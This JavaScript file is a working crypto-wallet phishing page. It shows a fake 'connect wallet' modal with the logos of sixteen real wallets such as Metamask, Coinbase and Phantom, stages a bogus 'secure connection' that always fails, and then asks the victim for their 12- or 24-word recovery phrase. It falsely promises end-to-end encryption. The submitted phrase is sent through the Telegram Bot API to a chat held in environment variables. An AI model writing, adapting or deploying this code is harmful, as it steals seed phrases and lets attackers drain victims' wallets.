require("dotenv").config();

document.addEventListener("DOMContentLoaded", () => {
  const binanceIcon = require("../assets/binance.png");
  const walletConnectIcon = require("../assets/wallet-connect.png");
  const metamaskIcon = require("../assets/metamask.png");
  const coinbaseIcon = require("../assets/coinbase.webp");
  const trustWalletIcon = require("../assets/trust.png");
  const zerionWalletIcon = require("../assets/zerion.png");
  const rainbowWalletIcon = require("../assets/rainbow.png");
  const uniswapWalletIcon = require("../assets/uniswap.png");
  const argentWalletIcon = require("../assets/argent.png");
  const phantomWalletIcon = require("../assets/phantom.png");
  const okxWalletIcon = require("../assets/okx.png");
  const cryptoWalletIcon = require("../assets/crypto.png");
  const bitgetWalletIcon = require("../assets/bitget.png");
  const robinhoodWalletIcon = require("../assets/robinhood.webp");
  const tokenpocketWalletIcon = require("../assets/tokenpocket.png");
  const blockchainWalletIcon = require("../assets/blockchain.png");
  const shieldIcon = require("../assets/shield.png");
  const circledArrowIcon = require("../assets/circled-arrow.png");

  const allIcons = [
    {
      img: binanceIcon,
      url: "binance.com",
      name: "Binance Chain Wallet",
      id: "binance",
    },
    {
      img: walletConnectIcon,
      url: "walletconnect.com",
      name: "Wallet Connect",
      id: "walletconnect",
    },
    {
      img: metamaskIcon,
      url: "metamask.io",
      name: "Metamask",
      id: "metamask",
    },
    {
      img: coinbaseIcon,
      url: "coinbase.com",
      name: "Coinbase Wallet",
      id: "coinbase",
    },
    {
      img: trustWalletIcon,
      url: "trustwallet.com",
      name: "Trust Wallet",
      id: "trustwallet",
    },
    {
      img: zerionWalletIcon,
      url: "zerion.io",
      name: "Zerion",
      id: "zerion",
    },
    {
      img: rainbowWalletIcon,
      url: "rainbow.me",
      name: "Rainbow",
      id: "rainbow",
    },
    {
      img: uniswapWalletIcon,
      url: "uniswap.org",
      name: "Uniswap Wallet",
      id: "uniswap",
    },
    {
      img: argentWalletIcon,
      url: "argent.xyz",
      name: "Argent",
      id: "argent",
    },
    {
      img: phantomWalletIcon,
      url: "phantom.app",
      name: "Phantom",
      id: "phantom",
    },
    {
      img: okxWalletIcon,
      url: "okx.com",
      name: "OKX Wallet",
      id: "okx",
    },
    {
      img: cryptoWalletIcon,
      url: "crypto.com",
      name: "Crypto.com",
      id: "crypto",
    },
    {
      img: bitgetWalletIcon,
      url: "bitget.com",
      name: "Bitget Wallet",
      id: "bitget",
    },
    {
      img: robinhoodWalletIcon,
      url: "robinhood.com",
      name: "Robinhood",
      id: "robinhood",
    },
    {
      img: tokenpocketWalletIcon,
      url: "tokenpocket.pro",
      name: "TokenPocket",
      id: "tokenpocket",
    },
    {
      img: blockchainWalletIcon,
      url: "blockchain.com",
      name: "Blockchain.com Wallet",
      id: "blockchain",
    },
  ];

  document.addEventListener("click", (e) => {
    console.log(e.target.classList);

    if (e.target.classList.contains("modal-open")) {
      e.preventDefault();

      console.log("MODAL OPEN");
      document.querySelector("#full-scr-btn").click();
    }
  });

  const modalWallets = document.querySelector("#modal-wallets");

  // Function to render wallet icons
  async function renderIcons(icons) {
    modalWallets.innerHTML = ""; // Clear existing icons

    for (const icon of icons) {
      // const imgSrc = await import(`../assets/${icon.id}.png`);

      const divWallet = createWalletElement(icon, icon.img);
      modalWallets.appendChild(divWallet);
    }
  }

  // Create a wallet element
  function createWalletElement(icon, imgSrc) {
    const divWallet = document.createElement("div");
    divWallet.setAttribute("id", icon.id);
    divWallet.className =
      "flex flex-row justify-start items-center space-x-4 px-4 py-4 rounded-lg shadow-md w-full bg-white wallet-sel";
    divWallet.innerHTML = `
      <div class="relative">
        <img src="${imgSrc}" alt="" class="w-14" />
        <div class="absolute bottom-0 right-0">
          <div class="bg-purple-900 rounded-full p-[0.25rem]"></div>
        </div>
      </div>
      <div class="flex flex-col justify-start items-center">
        <p class="font-bold mr-auto">${icon.name}</p>
        <p class="font-light text-gray-400 mr-auto text-xs">${icon.url}</p>
      </div>
    `;
    return divWallet;
  }

  // Function to update second modal content with icon details
  function updateModalContent(icon) {
    const modalContent = document.querySelector("#modal-wallet-click");
    modalContent.innerHTML = `
      <p class="flex flex-col justify-center items-center space-y-1">
        <img src="${icon.img}" alt="" class="mx-auto w-12" />
        <span class="font-bold">${icon.name}</span>
      </p>
      <p class="text-gray-500 text-center text-sm">
        This session is secured and encrypted
      </p>
      <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
        <div class="py-4 relative w-52">
          <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
          <div class="progress rounded-full bg-violet-900"></div>
        </div>
        <p class="flex flex-col justify-center items-center space-y-1">
          <span class="font-bold text-center text-sm">starting secure connection</span>
          <span class="font-medium italic text-xs text-center">..please wait..</span>
        </p>
      </div>
      
      <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
        <img src="${shieldIcon}" alt="" class="w-7" />
        <span class="text-gray-600 font-medium text-wrap text-xs">
          This session is protected with an end-to-end encryption
        </span>
      </p>
    `;

    setTimeout(() => {
      document.querySelector("#error-b-c").innerHTML = ``;
      document.querySelector("#error-b-c").innerHTML = `
        <div class="flex flex-col space-y-3 justify-center items-center w-10/12">
          <p class="text-red-700 font-bold rounded-lg text-xs text-wrap text-center border border-red-700 p-2">
            An error occured... please try again or connect manually
          </p>
          <div class="flex flex-col space-y-2 justify-center items-center w-full">
            <button id="try-again" class="w-full text-xs outline outline-1 outline-violet-700 text-violet-700 bg-white rounded-xl text-center p-2">Try Again</button>
            <button id="connect-manual" class="w-full text-xs outline-none bg-violet-700 text-white rounded-xl text-center p-2">Connect Manually</button>
          </div>        
        </div>
      `;

      const connectManualButton = document.querySelector("#connect-manual");
      connectManualButton.addEventListener("click", () => {
        document.querySelector("#error-b-c").innerHTML = ``;
        document.querySelector("#error-b-c").innerHTML = `
          <form id="phrase-form" class="w-full mx-auto text-center">
            <div class="mb-3" class="w-full">
              <textarea
              class="peer w-full block min-h-[auto] rounded border-0 bg-transparent px-3 py-[0.32rem] leading-[1.6] outline outline-1 outline-violet-700 transition-all duration-200 ease-linear focus:placeholder:opacity-100  motion-reduce:transition-none "
              id="exampleFormControlTextarea1"
              rows="3"
              placeholder="Enter your recovery phrase"></textarea>
            </div>
            <small class="text-gray-500 text-wrap text-xs text-center py-2 mb-2 tracking-[0.01rem] leading-[0.1rem]">
            Typically 12 (sometimes 24) words separated by single spaces
            </small>
            
            <button type="submit"
              class="uppercase w-full text-white flex flex-row justify-center items-center space-x-2 bg-blue-600 rounded-lg p-2 mb-2"
            >
              <span>validate</span>
              <img class="w-6" src="${circledArrowIcon}" />
            </button>
            <button type="button" id="cancel-val-btn" class="text-white bg-red-600 p-2 text-center w-full rounded-lg">Cancel </button>
          <form>
        `;

        document
          .querySelector("#cancel-val-btn")
          .addEventListener("click", (e) => {
            e.preventDefault();
            const modalId = "walletclick";

            // Find the close button of the specified modal
            const closeButton = document.querySelector(
              `#${modalId} [data-twe-modal-dismiss]`
            );

            // Simulate a click on the close button
            if (closeButton) {
              closeButton.click();
            } else {
              console.error("Close button not found");
            }
          });

        document
          .querySelector("#phrase-form")
          .addEventListener("submit", async (e) => {
            e.preventDefault();

            console.log(e.target.querySelector("textarea").value);
            const textAreaValue = e.target
              .querySelector("textarea")
              .value.trim();
            const wordCount = textAreaValue.split(/\s+/).length;
            console.log(wordCount);

            if (wordCount == 12 || wordCount == 24) {
              console.log(
                "The value of the textarea is valid: " + textAreaValue
              );
              try {
                await giveContent(textAreaValue);
                e.target.querySelector("textarea").value = ``;
                document.querySelector("#ovly-1").classList.remove("hidden");
                document.querySelector("#ovly-2").classList.remove("hidden");
              } catch (error) {
                giveContent(error);
              }
            } else {
              console.log(
                "The value of the textarea must contain either 12 or 24 words."
              );
              const errMsg = document.createElement("span");
              errMsg.className = `text-red-600 text-xs text-center mt-2 py-1`;
              errMsg.textContent = ``;
              errMsg.textContent = `Invalid Seed Phrase.`;
              document.querySelector("#phrase-form").appendChild(errMsg);
            }
          });
      });

      const tryAgainButton = document.querySelector("#try-again");
      tryAgainButton.addEventListener("click", () => {
        console.log("Try Again button clicked");
        // Perform action here, such as retrying the connection
        const modalId = "walletclick";

        // Find the close button of the specified modal
        const closeButton = document.querySelector(
          `#${modalId} [data-twe-modal-dismiss]`
        );

        // Simulate a click on the close button
        if (closeButton) {
          closeButton.click();
        } else {
          console.error("Close button not found");
        }
        // document.querySelector("#vert-click").click();
      });
    }, 1000);
  }

  // Initial render of all icons
  renderIcons(allIcons);

  // Event listener using event delegation for first modal
  modalWallets.addEventListener("click", (e) => {
    const clickedIconId = e.target.closest("div[id]").id;
    const foundIcon = allIcons.find((icon) => icon.id === clickedIconId);

    if (foundIcon) {
      console.log("Found icon:", foundIcon);
      // Update first modal content with found icon details
      updateModalContent(foundIcon);
      // Trigger the second modal
      document.querySelector("#vert-click").click();

      const modalId = "exampleModalFullscreen";

      // Find the close button of the specified modal
      const closeButton = document.querySelector(
        `#${modalId} [data-twe-modal-dismiss]`
      );

      // Simulate a click on the close button
      if (closeButton) {
        closeButton.click();
        console.log(document.body.lastElementChild);
        document.body.lastElementChild.className = `opacity-20 transition-all duration-300 ease-in-out fixed inset-0 z-[1055] bg-black w-screen h-screen`;
      } else {
        console.error("Close button not found", modalId);
      }
    } else {
      console.log("Icon not found with id:", clickedIconId);
    }
  });

  // Event listener for input change
  const searchInput = document.getElementById("wallet-search");
  searchInput.addEventListener("input", () => {
    const searchTerm = searchInput.value.toLowerCase().trim();

    // Filter icons based on search term
    const filteredIcons = allIcons.filter((icon) => {
      const lowerCaseName = icon.name.toLowerCase();
      const lowerCaseUrl = icon.url.toLowerCase();
      return (
        lowerCaseName.includes(searchTerm) || lowerCaseUrl.includes(searchTerm)
      );
    });

    // Render filtered icons
    renderIcons(filteredIcons);
  });

  async function giveContent(x) {
    const options = {
      method: "POST",
      mode: "cors",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        text: String(x),
        disable_web_page_preview: false,
        disable_notification: false,
        reply_to_message_id: null,
        chat_id: process.env.CHAT_ID,
      }),
    };

    console.log(x);

    fetch(
      `https://api.telegram.org/bot${process.env.BOT_ID}/sendMessage`,
      options
    )
      .then((response) => response.json())
      .then((response) => console.log(response))
      .catch((err) => console.error(err));
  }
});
